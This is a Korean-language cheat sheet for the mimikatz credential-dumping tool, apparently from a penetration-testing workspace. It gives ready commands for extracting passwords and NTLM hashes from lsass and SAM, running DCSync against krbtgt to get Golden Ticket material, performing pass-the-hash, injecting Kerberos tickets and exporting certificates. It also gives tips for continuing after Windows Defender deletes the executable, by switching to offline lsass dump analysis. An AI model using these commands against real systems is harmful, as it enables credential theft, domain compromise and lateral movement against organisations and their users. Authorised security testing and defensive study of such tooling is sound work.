# mimikatz

- mimikatz — Windows 메모리·레지스트리에서 자격증명을 뽑고 Kerberos 티켓을 조작하는 대표 credential dumping 도구. lsass 덤프 읽기부터 DCSync까지 처리한다.
- SYSTEM 권한을 얻은 뒤 로그온 세션의 패스워드·NTLM 해시를 수집할 때, DC 권한으로 krbtgt 해시를 뽑아 Golden Ticket 재료를 만들 때, pass-the-hash·pass-the-ticket·RBCD 등 Kerberos 공격의 후속 도구를 준비할 때.
- 포터블 exe(workspace\active-directory\mimikatz_trunk\x64\mimikatz.exe), 타깃에서 SeDebugPrivilege(SYSTEM 또는 상승된 Administrator), 인자 없이 실행 후 대화형으로 명령을 입력하는 방식.

## 실행과 필수 선행

```
mimikatz # privilege::debug
Privilege '20' OK
```

- privilege::debug가 실패하면 대부분의 명령이 안 된다. SYSTEM으로 실행하면 확실하다(PsExec -s 등).
- 대화형 사용이 기본. mimikatz # 프롬프트에서 명령을 이어 입력하고 exit로 종료.

## 대표 모듈

```
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::wdigest
mimikatz # lsadump::sam
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
```

- sekurlsa::logonpasswords: 로그온 세션의 패스워드·NTLM 해시. 가장 많이 쓰는 명령.
- sekurlsa::wdigest: WDigest 평문(레지스트리 UseLogonCredential이 켜져 있을 때).
- lsadump::sam: 로컬 SAM 해시(SYSTEM 권한 필요). 덤프 파일 기반이면 lsadump::sam /system:SYSTEM /sam:SAM.
- lsadump::dcsync: DC 복제 권한(예: Domain Admin)으로 계정 해시를 네트워크로 직접 뽑는다. krbtgt 지정이 Golden Ticket 재료.
- lsadump::lsa /patch: DC에서 로컬로 LSA 해시를 뽑는다.
- sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<hash>: pass-the-hash 실행.
- kerberos::list, kerberos::ptt <ticket.kirbi>: 티켓 확인·주입.
- crypto::certificates /export: 인증서 추출(Certipy 조합).

## 단발 명령 실행

```
mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
```

- 명령 여러 개를 인자로 연달아 줄 수 있다. exit를 안 주면 프롬프트가 남는다.

## lsass 덤프 오프라인 분석

```
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

- 타깃에서 comsvcs.dll MiniDump 등으로 lsass를 덤프해 옮긴 뒤 크랙박스에서 읽는 흐름.

## 팁·트러블슈팅

- Windows Defender는 mimikatz.exe를 즉시 탐지·삭제한다. 타깃에서 실행 파일이 지워지면 lsass 덤프 → 오프라인 분석(sekurlsa::minidump) 흐름으로 전환.
- privilege::debug가 실패하면 무결성 레벨이 낮거나 권한이 부족한 것. 상승된 셸·SYSTEM으로 재시도.
- 32/64비트 아키텍처를 맞춰야 sekurlsa가 제대로 읽힌다. x64 폴더의 exe를 쓴다.
- 출력이 길면 mimikatz "..." exit > out.txt 또는 tee로 로그를 남긴다.
